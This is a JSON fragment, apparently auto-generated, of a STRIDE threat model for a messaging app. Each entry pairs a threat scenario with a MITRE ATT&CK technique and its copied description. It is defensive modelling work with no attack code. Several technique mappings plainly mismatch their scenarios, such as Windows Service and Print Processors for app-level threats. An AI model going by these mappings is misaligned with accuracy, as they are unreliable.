            "Scenario": "An attacker intercepts the connection and presents a false identity to the user, impersonating a trusted contact.",
            "Assumptions": [
                {
                    "Assumption": "User connections can be intercepted.",
                    "Role": "Attacker",
                    "Condition": "When users connect over insecure networks."
                },
                {
                    "Assumption": "Users don't validate the contact's identity key.",
                    "Role": "User",
                    "Condition": "If users overlook security warnings or identity validation steps."
                },
                {
                    "Assumption": "The attacker has access to the network layer.",
                    "Role": "Attacker",
                    "Condition": "On compromised or public networks."
                }
            ],
            "Potential Impact": "Confidentiality is compromised if private conversations are exposed.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "network",
                "identity spoofing",
                "trusted contact"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to a user's primary device, subsequently adding a malicious companion device without user knowledge.",
            "Assumptions": [
                {
                    "Assumption": "The primary device can be physically accessed or remotely compromised.",
                    "Role": "Attacker",
                    "Condition": "When the user\u2019s device lacks sufficient security controls."
                },
                {
                    "Assumption": "Users might not notice the addition of a new device.",
                    "Role": "User",
                    "Condition": "If they do not frequently check their security settings."
                },
                {
                    "Assumption": "Attackers can bypass or exploit weak authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "With the primary device compromised."
                }
            ],
            "Potential Impact": "Data integrity and confidentiality are compromised if sensitive data is accessed or altered.",
            "MITRE ATT&CK Keywords": [
                "physical access",
                "remote access",
                "device spoofing",
                "compromised device"
            ],
            "mitre_technique": {
                "name": "Remote Access Software",
                "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
                "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
                "technique_id": "T1219"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters messages in transit over the network, modifying the content without the recipient's knowledge.",
            "Assumptions": [
                {
                    "Assumption": "The network can be intercepted and decrypted to some extent.",
                    "Role": "Attacker",
                    "Condition": "If encryption keys are not properly protected."
                },
                {
                    "Assumption": "Users do not verify message integrity.",
                    "Role": "User",
                    "Condition": "When users assume the received messages are authentic by default."
                },
                {
                    "Assumption": "Attackers can remain undetected within the network.",
                    "Role": "Attacker",
                    "Condition": "If network monitoring is insufficient or compromised."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to potential misinformation or fraud.",
            "MITRE ATT&CK Keywords": [
                "message injection",
                "network",
                "message tampering",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the SQLite database on a device and alters stored messages or authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "SQLite databases are not encrypted or encryption is weak.",
                    "Role": "Application",
                    "Condition": "If encryption standards are not strictly enforced."
                },
                {
                    "Assumption": "The device's file system can be accessed by the attacker.",
                    "Role": "Attacker",
                    "Condition": "If the device lacks proper access controls."
                },
                {
                    "Assumption": "Users do not notice unauthorized changes in their messages or credentials.",
                    "Role": "User",
                    "Condition": "If application interface does not alert users to changes."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to unauthorized actions and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "local storage",
                "credential tampering",
                "device access"
            ],
            "mitre_technique": {
                "name": "Local Data Staging",
                "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
                "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
                "technique_id": "T1074.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the messaging application's update process, compromising future versions.",
            "Assumptions": [
                {
                    "Assumption": "The update process is not properly secured or verified.",
                    "Role": "Application",
                    "Condition": "If code signing and verification mechanisms are inadequate."
                },
                {
                    "Assumption": "Users automatically accept updates without verification.",
                    "Role": "User",
                    "Condition": "If users trust the update source implicitly."
                },
                {
                    "Assumption": "Attackers can gain access to the update distribution channel.",
                    "Role": "Attacker",
                    "Condition": "If the update server is compromised."
                }
            ],
            "Potential Impact": "Confidentiality, integrity, and availability are compromised if the application is maliciously altered.",
            "MITRE ATT&CK Keywords": [
                "software update",
                "injection",
                "code signing",
                "distribution channel"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker sends messages using another user's identity, leading to potential disputes or legal issues.",
            "Assumptions": [
                {
                    "Assumption": "The application lacks non-repudiation mechanisms.",
                    "Role": "Application",
                    "Condition": "If there are no logs or digital signatures."
                },
                {
                    "Assumption": "User devices can be compromised to send unauthorized messages.",
                    "Role": "Attacker",
                    "Condition": "If the device is not adequately secured."
                },
                {
                    "Assumption": "Users suspect foul play after the fact.",
                    "Role": "User",
                    "Condition": "When disputes arise regarding message authenticity."
                }
            ],
            "Potential Impact": "Integrity is compromised, leading to potential conflict and legal repercussions.",
            "MITRE ATT&CK Keywords": [
                "identity abuse",
                "non-repudiation",
                "dispute",
                "legal"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having sent or received a specific message, leading to disputes and lack of accountability.",
            "Assumptions": [
                {
                    "Assumption": "No adequate logging or archiving mechanisms are in place.",
                    "Role": "Application",
                    "Condition": "If message history is not securely stored."
                },
                {
                    "Assumption": "Users engage in potentially disputable communications.",
                    "Role": "User",
                    "Condition": "In high-stakes or sensitive conversations."
                },
                {
                    "Assumption": "The application doesn\u2019t provide proof of message exchange.",
                    "Role": "Application",
                    "Condition": "If non-repudiation mechanisms aren't implemented."
                }
            ],
            "Potential Impact": "Integrity and accountability are compromised, leading to potential legal and interpersonal issues.",
            "MITRE ATT&CK Keywords": [
                "message denial",
                "proof of exchange",
                "logging",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Cloud Logs",
                "description": "An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021)",
                "id": "attack-pattern--cacc40da-4c9e-462c-80d5-fd70a178b12d",
                "technique_id": "T1562.008"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates message logs on a device to remove evidence of specific communications.",
            "Assumptions": [
                {
                    "Assumption": "Devices store logs locally without sufficient protection.",
                    "Role": "Application",
                    "Condition": "If logs are not encrypted or secured."
                },
                {
                    "Assumption": "Users do not regularly audit or maintain logs.",
                    "Role": "User",
                    "Condition": "If users rely solely on device-stored logs."
                },
                {
                    "Assumption": "Attackers have sufficient access to alter local logs.",
                    "Role": "Attacker",
                    "Condition": "If they compromise user devices."
                }
            ],
            "Potential Impact": "Integrity and accountability are compromised, leading to loss of evidence and accountability.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "evidence tampering",
                "access control",
                "device security"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the desktop client app to gain unauthorized access to user messages.",
            "Assumptions": [
                {
                    "Assumption": "The desktop client application has exploitable vulnerabilities.",
                    "Role": "Application",
                    "Condition": "If updates and patches are not timely or adequate."
                },
                {
                    "Assumption": "Users do not have effective malware protection.",
                    "Role": "User",
                    "Condition": "If security software is not used or updated."
                },
                {
                    "Assumption": "The attacker can execute remote code on the user\u2019s desktop client.",
                    "Role": "Attacker",
                    "Condition": "If remote vulnerabilities are present and exploitable."
                }
            ],
            "Potential Impact": "Confidentiality is compromised as sensitive messages are exposed.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "desktop client",
                "remote code execution",
                "information leakage"
            ],
            "mitre_technique": {
                "name": "Software Deployment Tools",
                "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
                "id": "attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414",
                "technique_id": "T1072"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data being transmitted, potentially revealing sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not fully encrypted end-to-end.",
                    "Role": "Application",
                    "Condition": "If there are gaps in the encryption protocol."
                },
                {
                    "Assumption": "Users transmit sensitive information over unsecured networks.",
                    "Role": "User",
                    "Condition": "When using public or compromised networks."
                },
                {
                    "Assumption": "Attackers have the necessary tools to intercept and decode the communications.",
                    "Role": "Attacker",
                    "Condition": "If interception tools are accessible and effective."
                }
            ],
            "Potential Impact": "Confidentiality is compromised as sensitive data is exposed.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted transmission",
                "public network",
                "sensitive information"
            ],
            "mitre_technique": {
                "name": "Email Collection",
                "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ",
                "id": "attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f",
                "technique_id": "T1114"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised primary device reveals all authentication credentials and encryption keys stored on the device.",
            "Assumptions": [
                {
                    "Assumption": "The primary device stores sensitive authentication credentials and keys unprotected.",
                    "Role": "Application",
                    "Condition": "If local storage is not properly secured."
                },
                {
                    "Assumption": "Users can lose control of their primary device.",
                    "Role": "User",
                    "Condition": "If the device is lost or stolen."
                },
                {
                    "Assumption": "Attackers can access and read the data on the seized device.",
                    "Role": "Attacker",
                    "Condition": "If the device lacks adequate access controls."
                }
            ],
            "Potential Impact": "Confidentiality is compromised as sensitive authentication credentials and encryption keys are exposed.",
            "MITRE ATT&CK Keywords": [
                "device compromise",
                "authentication credentials",
                "encryption keys",
                "data security"
            ],
            "mitre_technique": {
                "name": "Steal or Forge Authentication Certificates",
                "description": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)\n\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate\u2019s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate\u2019s subject alternative name (SAN) values define the certificate owner\u2019s alternate names.(Citation: Medium Certified Pre Owned)\n\nAbusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\n\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as \u201cgolden\u201d certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)",
                "id": "attack-pattern--7de1f7ac-5d0c-4c9c-8873-627202205331",
                "technique_id": "T1649"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the messaging application servers with excessive requests, rendering the service unavailable to legitimate users.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can generate a high volume of traffic.",
                    "Role": "Attacker",
                    "Condition": "If they have control over a botnet or significant resources."
                },
                {
                    "Assumption": "Application servers have limited capability to handle excessive load.",
                    "Role": "Application",
                    "Condition": "If servers are not sufficiently provisioned and protected."
                },
                {
                    "Assumption": "Legitimate users rely on server availability for communication.",
                    "Role": "User",
                    "Condition": "If the application is critical for their daily activities."
                }
            ],
            "Potential Impact": "Availability is compromised as legitimate users cannot access the service.",
            "MITRE ATT&CK Keywords": [
                "DoS attack",
                "server",
                "request flooding",
                "network overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the desktop client's handling of incoming messages to crash the application.",
            "Assumptions": [
                {
                    "Assumption": "The desktop client has unpatched vulnerabilities.",
                    "Role": "Application",
                    "Condition": "If updates and patches are not applied in a timely manner."
                },
                {
                    "Assumption": "Users rely on the desktop client for communication.",
                    "Role": "User",
                    "Condition": "If the desktop client is their primary communication tool."
                },
                {
                    "Assumption": "Attackers can craft messages that exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "If they have the technical skills to identify and exploit the flaw."
                }
            ],
            "Potential Impact": "Availability is compromised as users are unable to use the desktop client.",
            "MITRE ATT&CK Keywords": [
                "client crash",
                "message crafting",
                "vulnerability exploitation",
                "DoS"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the application's companion device linking process, causing repeated failures and preventing users from linking new devices.",
            "Assumptions": [
                {
                    "Assumption": "The linking process can be disrupted.",
                    "Role": "Attacker",
                    "Condition": "If the process is not securely designed or robust."
                },
                {
                    "Assumption": "Users need to link new devices periodically.",
                    "Role": "User",
                    "Condition": "In cases of device upgrades or replacements."
                },
                {
                    "Assumption": "Attackers have identified a method to interfere with the linking process.",
                    "Role": "Attacker",
                    "Condition": "If they understand the linking protocol and its potential weaknesses."
                }
            ],
            "Potential Impact": "Availability is compromised as users cannot link new devices.",
            "MITRE ATT&CK Keywords": [
                "linking process",
                "protocol disruption",
                "DoS",
                "companion device"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the messaging application to gain administrative rights and make high-privilege changes.",
            "Assumptions": [
                {
                    "Assumption": "The application has exploitable vulnerabilities.",
                    "Role": "Application",
                    "Condition": "If security updates and patching are not thorough."
                },
                {
                    "Assumption": "Attackers can identify and exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "If they have the technical skills and tools necessary."
                },
                {
                    "Assumption": "Users do not detect or report unusual activity.",
                    "Role": "User",
                    "Condition": "If users lack awareness or monitoring capabilities."
                }
            ],
            "Potential Impact": "Confidentiality, integrity, and availability are compromised as the attacker gains full control.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "administrative rights",
                "vulnerability exploitation",
                "high-privilege access"
            ],
            "mitre_technique": {
                "name": "Print Processors",
                "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
                "technique_id": "T1547.012"
            }
        },
        {
